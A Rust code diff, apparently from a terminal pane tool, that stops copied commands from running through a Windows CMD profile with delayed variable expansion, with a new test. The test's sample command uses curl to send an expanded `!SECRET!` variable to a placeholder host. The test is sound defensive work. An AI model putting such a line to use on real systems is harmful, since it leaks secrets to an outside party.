@@ -35,9 +35,14 @@ pub const ORDINARY_DIALECT: ShellDialect = if cfg!(windows) {
 struct Uncarried;
 
 /// `launch`'s creation command as a shell of `dialect` reads it: its copied argv quoted for that shell, else the stored
-/// line as it is.
-fn creation_command(launch: &PaneLaunch, dialect: ShellDialect) -> Result<Option<String>, Uncarried> {
+/// line as it is. A copied argv is not carried through a `profile` that would expand variables in it.
+fn creation_command(
+    launch: &PaneLaunch,
+    dialect: ShellDialect,
+    profile: Option<&crate::shell_profiles::ShellProfile>,
+) -> Result<Option<String>, Uncarried> {
     match &launch.argv {
+        Some(_) if profile.is_some_and(|profile| !profile.reads_quoted_argv()) => Err(Uncarried),
         Some(argv) => dialect.line(argv).map(Some).ok_or(Uncarried),
         None => Ok(launch.command.clone()),
     }
@@ -132,7 +137,7 @@ fn resolve_seed_in(
         return LaunchSeed::default();
     };
     // an argv the shell cannot carry is planned with its stored line, so it is left out only where it would run
-    let (initial_command, uncarried) = match creation_command(&launch, dialect) {
+    let (initial_command, uncarried) = match creation_command(&launch, dialect, session.shell_profile_for(pane)) {
         Ok(command) => (command, false),
         Err(Uncarried) => (launch.command.clone(), true),
     };
@@ -231,7 +236,7 @@ fn live_creation_command(session: &Session, pane: StatusPane, configuration: &Co
         return launch.command.clone();
     };
     let dialect = profile_dialect(configuration.direct_profile.as_deref(), ShellDialect::of_shell(shell));
-    creation_command(launch, dialect).unwrap_or_else(|Uncarried| {
+    creation_command(launch, dialect, configuration.direct_profile.as_deref()).unwrap_or_else(|Uncarried| {
         warn_uncarried(session, pane, dialect);
         None
     })
@@ -564,6 +569,37 @@ mod tests {
         let mut user = session(Some("lazygit && echo done"), false, false);
         let seed = resolve_seed_in(&mut user, StatusPane::Left, &policy(false, &[]), ShellDialect::Cmd);
         assert_eq!(seed.command.as_deref(), Some("lazygit && echo done"));
+    }
+
+    /// A CMD profile with delayed expansion on would read a copied argument's `!NAME!` as a variable: the copy starts
+    /// the profile's plain shell, ordinary and Live alike; with it off the argv runs quoted.
+    #[test]
+    fn a_delayed_expansion_cmd_profile_does_not_carry_a_copied_argv() {
+        use crate::shell_profiles::ShellProfile;
+        let argv = ["curl", "https://x/?q=!SECRET!"];
+        let delayed = ShellProfile::new("cmd", "CMD", "C:/Windows/System32/cmd.exe".into(), &["/D", "/V:ON"]);
+        let mut copy = copied(&argv, ShellDialect::Cmd, false);
+        copy.shell_profile = Some(delayed.clone());
+        let seed = resolve_seed(&mut copy, StatusPane::Left, &policy(false, &[]));
+        assert_eq!(seed.command, None);
+        let mut live = wrapped_in("C:/Windows/System32/cmd.exe");
+        live.direct_profile = Some(Box::new(delayed));
+        assert_eq!(live_creation_command(&copy, StatusPane::Left, &live), None);
+        let plain = ShellProfile::new(
+            "cmd",
+            "CMD",
+            "C:/Windows/System32/cmd.exe".into(),
+            &["/D", "/V:ON", "/V:OFF"],
+        );
+        copy.shell_profile = Some(plain.clone());
+        let quoted = ShellDialect::Cmd.line(&argv.map(str::to_owned));
+        assert!(quoted.is_some());
+        assert_eq!(
+            resolve_seed(&mut copy, StatusPane::Left, &policy(false, &[])).command,
+            quoted
+        );
+        live.direct_profile = Some(Box::new(plain));
+        assert_eq!(live_creation_command(&copy, StatusPane::Left, &live), quoted);
     }
 
     /// Where the creation command would not run (a captured job preempts it), an uncarried argv changes nothing.
